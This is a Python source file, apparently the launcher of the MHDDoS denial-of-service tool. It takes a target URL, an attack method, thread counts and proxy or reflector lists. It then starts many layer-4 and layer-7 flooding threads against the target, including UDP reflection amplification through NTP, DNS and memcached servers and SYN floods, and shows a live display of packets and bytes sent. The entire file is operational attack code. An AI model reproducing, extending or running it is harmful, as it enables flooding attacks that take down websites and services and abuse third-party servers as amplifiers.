import json
import logging
import os
import time
from _socket import gethostbyname
from contextlib import suppress
from logging import basicConfig, getLogger, shutdown
from os import _exit
from pathlib import Path
from sys import argv
from threading import Event

from PyRoxy import Tools as ProxyTools
from rich.console import Console, RenderableType
from rich.live import Live
from rich.style import Style
from rich.table import Table
from rich.text import Text
from yarl import URL

from MHDDoS.methods.layer_4 import Layer4
from MHDDoS.methods.layer_7 import Layer7
from MHDDoS.methods.methods import Methods
from MHDDoS.methods.tools import Tools
from MHDDoS.utils.misc import Counter
from MHDDoS.utils.proxies import ProxyManager

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")
logger.handlers.clear()

__version__: str = "MHDDOS"
__dir__: Path = Path(__file__).parent
logger = logging.getLogger()
bombardier_path: str = ""

console = Console()


def exit(*message):
    if message:
        logger.error(" ".join(message))
    shutdown()
    _exit(1)


def start():
    global BYTES_SENT, \
        REQUESTS_SENT, \
        TOTAL_BYTES_SENT, \
        TOTAL_REQUESTS_SENT, \
        LAST_REQUEST_TIMESTAMP

    # COUNTERS
    REQUESTS_SENT = Counter()
    BYTES_SENT = Counter()
    TOTAL_REQUESTS_SENT = Counter()
    TOTAL_BYTES_SENT = Counter()
    LAST_REQUEST_TIMESTAMP = Counter()

    with open(__dir__ / "config.json") as f:
        config = json.load(f)
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                Tools.runConsole()
            if one == "STOP":
                Tools.stop()

            method = one
            host = None
            url = None
            urlraw = None
            event = Event()
            event.clear()
            host = None
            urlraw = argv[2].strip()
            urlraw = Tools.ensure_http_present(urlraw)
            port = None
            proxies = None

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:

                # HANDLE PARAMETERS
                url = URL(urlraw)
                host = url.host
                try:
                    host = gethostbyname(url.host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)
                ip = Tools.get_ip(urlraw)
                # print(f"IP: {ip}")
                # print(f"Port: {url.port}")
                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])

                # HANDLE PROXIES
                proxy_type = int(argv[3].strip())
                proxy_path_relative = argv[5].strip()
                proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                    proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)

                proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), method, urlraw)

                # HANDLE BOMBARDIER
                global bombardier_path
                bombardier_path = Path(__dir__ / "go/bin/bombardier")
                if method == "BOMB":
                    assert (
                            bombardier_path.exists()
                            or bombardier_path.with_suffix('.exe').exists()
                    ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                # HANDLE USERAGENTS
                useragent_file_path = Path(__dir__ / "files/useragent.txt")
                if not useragent_file_path.exists():
                    exit("The Useragent file doesn't exist ")
                uagents = set(a.strip()
                              for a in useragent_file_path.open("r+").readlines())
                if not uagents: exit("Empty Useragent File ")

                # HANDLE REFERRERS
                referrers_file_path = Path(__dir__ / "files/referers.txt")
                if not referrers_file_path.exists():
                    exit("The Referer file doesn't exist ")
                referers = set(a.strip()
                               for a in referrers_file_path.open("r+").readlines())
                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Number of threads is higher than 1000")
                if rpc > 100:
                    logger.warning("RPC (Requests Per Connection) number is higher than 100")

                for _ in range(threads):
                    Layer7(url, host, method, rpc, event, list(uagents), list(referers), list(proxies), BYTES_SENT, REQUESTS_SENT, LAST_REQUEST_TIMESTAMP).start()

            if method in Methods.LAYER4_METHODS:
                # HANDLE PARAMETERS
                url = URL(urlraw)
                port = url.port
                host = url.host

                try:
                    host = gethostbyname(host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                        not Tools.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                referrers = None
                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        referrers_file_path = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                            if not referrers_file_path.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                                referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
                            if not referrers:
                                exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_type = int(argfive)
                            proxy_path_relative = argv[6].strip()
                            proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                            if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                                proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
                            proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                            proxies = ProxyManager.validateProxyList(proxies, ip, port, method, urlraw)
                            if method not in {"MINECRAFT", "MCBOT", "TCP"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")

                for _ in range(threads):
                    Layer4((host, port), referrers, method, event, proxies, BYTES_SENT, REQUESTS_SENT, LAST_REQUEST_TIMESTAMP).start()

            # start health check thread
            if not port:
                if urlraw and "https://" in urlraw:
                    port = 443
                else:
                    port = 80
            if not host:
                host = Tools.get_ip(urlraw)
            ip = host
            # health_check_thread = Thread(
            #     daemon=True,
            #     target=connectivity_check_loop,
            #     args=(CONNECTIVITY_CHECK_INTERVAL, ip, port, method, urlraw, proxies)
            # )
            # health_check_thread.start()

            logger.info(f"Starting attack upon {host or url.human_repr()} using {method} method for {timer} seconds, threads: {threads}!")
            event.set()
            ts = time.time()

            console.print("\n")

            try:
                with Live(get_attack_status_text(), refresh_per_second=1) as live:
                    while time.time() < ts + timer:
                        # update request counts
                        TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
                        TOTAL_BYTES_SENT += int(BYTES_SENT)
                        REQUESTS_SENT.set(0)
                        BYTES_SENT.set(0)

                        # craft the status log message
                        live.update(get_attack_status_text())

                        time.sleep(1)
            except (KeyboardInterrupt, SystemExit):
                pass

            event.clear()
            exit()

        Tools.usage()


BYTES_SENT = Counter()
REQUESTS_SENT = Counter()
TOTAL_BYTES_SENT = Counter()
TOTAL_REQUESTS_SENT = Counter()
LAST_REQUEST_TIMESTAMP = Counter()

status_logging_started = False
is_first_health_check_done = False
last_target_health_check_timestamp = -1
last_l4_result = None
last_l4_proxied_results = None
last_l7_response = None
last_l7_proxied_responses = None


class Styles:
    ok = Style(color="green")
    bad = Style(color="red")


def get_attack_status_text() -> RenderableType:
    # craft the status log message
    pps = Tools.humanformat(int(REQUESTS_SENT))
    bps = Tools.humanbytes(int(BYTES_SENT))
    tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
    tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
    tslr = time.time() - float(LAST_REQUEST_TIMESTAMP)
    tslr_string = f"{tslr * 1000:.0f} ms"

    if int(BYTES_SENT) == 0:
        pps = Text(pps, style=Styles.bad)
        bps = Text(bps, style=Styles.bad)
    else:
        pps = Text(pps, style=Styles.ok)
        bps = Text(bps, style=Styles.ok)
    if int(TOTAL_BYTES_SENT) == 0:
        tp = Text(tp, style=Styles.bad)
        tb = Text(tb, style=Styles.bad)
    if tslr > 10:
        tslr_string = Text(tslr_string, style=Styles.bad)

    grid = Table.grid()

    grid.add_row(Text("Status:", overflow="ellipsis", no_wrap=True))
    grid.add_row(Text("    Outgoing data:"))
    grid.add_row(Text("       Per second:"))
    grid.add_row(Text("          Packets/s: ") + pps)
    grid.add_row(Text("          Bytes/s:   ") + bps)
    grid.add_row(Text("    Total since the attack started: "))
    grid.add_row(Text("          Packets sent: ") + tp)
    grid.add_row(Text("          Bytes sent:  ") + tb)
    grid.add_row(Text("    Time since last request: ") + tslr_string)

    return grid


if __name__ == '__main__':
    start()
